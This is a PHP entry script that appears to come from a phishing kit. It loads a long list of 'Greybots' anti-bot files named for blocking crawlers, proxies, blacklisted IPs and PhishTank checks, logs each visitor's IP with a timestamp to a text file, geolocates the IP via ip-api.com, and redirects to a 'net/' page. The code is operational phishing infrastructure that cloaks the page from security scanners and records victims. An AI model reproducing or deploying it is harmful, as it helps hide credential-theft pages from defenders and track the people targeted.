<?php
session_start();

	include "Greybots/Bad_ip.php";
	include "Greybots/Grey-Bot-1.php";
	include "Greybots/Grey-Bot-2.php";
	include "Greybots/Grey-Bot-3.php";
	include "Greybots/Grey-Bot-4.php";
	include "Greybots/Grey-Bot-5.php";
	include "Greybots/Grey-Bot-6.php";
	include "Greybots/Grey-Bot-7.php";
	include "Greybots/Grey-Bot-8.php";
	include "Greybots/Grey-Bot-9.php";
	include "Greybots/Grey-Bot-10.php";
	include "Greybots/Grey-Bot-11.php";
	include "Greybots/Grey-Bot-12.php";
	include "Greybots/Grey-Bot-Crawler.php";
	include "Greybots/Grey-IP-BlackList.php";
	include "Greybots/Grey-Phishingtank.php";
	include "Greybots/Grey-antibot-phishtank.php";
	include "Greybots/Grey-Proxyblock.php";
	include "Greybots/Grey-userAgent-1.php";
	include "Greybots/Grey-userAgent-2.php";
	include "Greybots/Grey-antibot-host.php";
	include "Greybots/Grey-antibot-ip.php";
	include "Greybots/Grey-antibot-proxy.php";
	include "Greybots/Grey-Blocker.php";
	include "Greybots/Grey-Bot.php";


$ip = getenv("REMOTE_ADDR");


$file = fopen("v.txt","a");


fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;


header('Location: net/');
